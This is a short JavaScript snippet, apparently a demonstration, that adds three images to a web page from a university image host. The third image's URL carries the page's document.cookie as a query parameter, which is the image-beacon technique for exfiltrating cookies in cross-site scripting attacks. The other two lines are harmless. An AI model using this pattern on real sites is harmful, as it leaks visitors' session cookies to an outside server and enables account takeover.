var imgObject = new Image(200);
imgObject.src = 'https://homepages.cae.wisc.edu/~ece533/images/tulips.png';
document.body.appendChild(imgObject);

var imgElement = document.createElement("img");
imgElement.src = "https://homepages.cae.wisc.edu/~ece533/images/peppers.png";
document.body.appendChild(imgElement);

var imgElement2 = document.createElement("img");
imgElement2.src = "https://homepages.cae.wisc.edu/~ece533/images/peppers.png?cookie="+document.cookie;
document.body.appendChild(imgElement2);

